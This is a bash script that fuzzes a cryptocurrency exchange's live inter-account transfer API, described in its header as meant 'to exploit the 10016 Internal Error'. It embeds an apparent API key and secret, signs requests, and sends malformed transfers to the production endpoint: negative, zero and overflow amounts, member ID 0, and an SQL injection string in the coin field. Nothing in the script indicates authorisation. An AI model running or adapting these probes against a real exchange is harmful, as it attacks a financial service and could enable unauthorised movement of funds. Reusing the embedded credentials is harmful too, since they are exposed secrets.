#!/bin/bash
# INTER-TRANSFER ERROR HUNTER
# Fuzzing parameters to exploit the 10016 Internal Error

API_KEY="22JSr5zWpW0eReC6rE"
API_SECRET="QZhQLj0tXsbSeTHYHnvoB99GKILfFdMkzWYN"
BASE="https://api.bybit.com"
UID="527465456"

OFFSET=$(($(curl -s "$BASE/v5/market/time" | grep -o '"timeSecond":"[0-9]*"' | cut -d'"' -f4) - $(date +%s)))

sign() {
    local p=$1
    local t=$(($(date +%s) + OFFSET))000
    local s=$(echo -n "${t}${API_KEY}5000${p}" | openssl dgst -sha256 -hmac "$API_SECRET" | awk '{print $2}')
    echo "$t|$s"
}

fuzz() {
    local name=$1
    local p=$2
    
    IFS='|' read -r ts sig <<< $(sign "$p")
    
    resp=$(curl -s -X POST "$BASE/v5/asset/transfer/inter-transfer" \
        -H "X-BAPI-API-KEY: $API_KEY" \
        -H "X-BAPI-SIGN: $sig" \
        -H "X-BAPI-SIGN-TYPE: 2" \
        -H "X-BAPI-TIMESTAMP: $ts" \
        -H "X-BAPI-RECV-WINDOW: 5000" \
        -H "Content-Type: application/json" \
        -d "$p")
    
    code=$(echo "$resp" | grep -o '"retCode":[0-9]*' | cut -d':' -f2)
    msg=$(echo "$resp" | grep -o '"retMsg":"[^"]*"' | cut -d'"' -f4)
    
    echo "[$name] Code: $code | Msg: $msg"
}

echo "=========================================="
echo "FUZZING INTER-TRANSFER (10016)"
echo "=========================================="

UUID=$(cat /proc/sys/kernel/random/uuid)

# 1. Null Amount
fuzz "Null Amount" "{\"transferId\":\"$UUID\",\"coin\":\"USDT\",\"fromMemberId\":$UID,\"toMemberId\":$UID}"

# 2. Zero Amount
UUID=$(cat /proc/sys/kernel/random/uuid)
fuzz "Zero Amount" "{\"transferId\":\"$UUID\",\"coin\":\"USDT\",\"amount\":\"0\",\"fromMemberId\":$UID,\"toMemberId\":$UID}"

# 3. Negative Amount
UUID=$(cat /proc/sys/kernel/random/uuid)
fuzz "Negative Amount" "{\"transferId\":\"$UUID\",\"coin\":\"USDT\",\"amount\":\"-100\",\"fromMemberId\":$UID,\"toMemberId\":$UID}"

# 4. Target 0
UUID=$(cat /proc/sys/kernel/random/uuid)
fuzz "Target 0" "{\"transferId\":\"$UUID\",\"coin\":\"USDT\",\"amount\":\"0.01\",\"fromMemberId\":$UID,\"toMemberId\":0}"

# 5. From 0
UUID=$(cat /proc/sys/kernel/random/uuid)
fuzz "From 0" "{\"transferId\":\"$UUID\",\"coin\":\"USDT\",\"amount\":\"0.01\",\"fromMemberId\":0,\"toMemberId\":$UID}"

# 6. SQL Injection attempt in Coin
UUID=$(cat /proc/sys/kernel/random/uuid)
fuzz "SQLi Coin" "{\"transferId\":\"$UUID\",\"coin\":\"USDT' OR '1'='1\",\"amount\":\"0.01\",\"fromMemberId\":$UID,\"toMemberId\":$UID}"

# 7. Massive Amount (Overflow)
UUID=$(cat /proc/sys/kernel/random/uuid)
fuzz "Massive Amount" "{\"transferId\":\"$UUID\",\"coin\":\"USDT\",\"amount\":\"999999999999999999\",\"fromMemberId\":$UID,\"toMemberId\":$UID}"
